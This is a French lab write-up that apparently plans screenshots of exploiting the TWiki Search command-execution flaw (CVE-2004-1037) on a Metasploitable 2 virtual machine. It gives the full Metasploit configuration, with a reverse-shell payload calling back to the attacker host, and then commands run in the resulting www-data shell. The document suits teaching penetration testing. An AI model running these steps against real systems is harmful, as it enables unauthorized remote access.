# Captures — TWiki Search, exécution de commande (MS2, port 80)

Cible : `192.168.56.101` · Kali/LHOST : `192.168.56.1`.
4 captures. Chaque capture montre **la commande tapée ET son résultat**.

## 01-recherche-module.png

Les deux recherches à la suite :
```bash
searchsploit twiki
msfconsole -q -x "search twiki; exit"
```

Encadrer en rouge : la ligne `TWiki ... Search Function Arbitrary Command Execution`
(searchsploit) et la ligne `exploit/unix/webapp/twiki_search` (search).

## 02-info-cve.png

Commande :
```bash
msfconsole -q -x "info exploit/unix/webapp/twiki_search; exit"
```

Encadrer en rouge : la ligne `https://nvd.nist.gov/vuln/detail/CVE-2004-1037`.

## 03-exploit-config.png

En interactif dans `msfconsole`, commande par commande :
```
msf6 > use exploit/unix/webapp/twiki_search
msf6 exploit(...) > set RHOSTS 192.168.56.101
msf6 exploit(...) > set RPORT 80
msf6 exploit(...) > set URI /twiki/bin
msf6 exploit(...) > set payload cmd/unix/reverse
msf6 exploit(...) > set LHOST 192.168.56.1
msf6 exploit(...) > set LPORT 4448
```

Encadrer en rouge : aucun (liste des `set` déjà lisible).

## 04-session-www-data.png

Déclenchement + preuve :
```
msf6 exploit(...) > run -z
msf6 exploit(...) > sessions -c "id; uname -a; hostname; whoami" -i 1
```

Encadrer en rouge : la ligne `[+] The target is vulnerable`, `[*] Command shell session 1
opened ...` et la ligne `uid=33(www-data) gid=33(www-data) ...`.
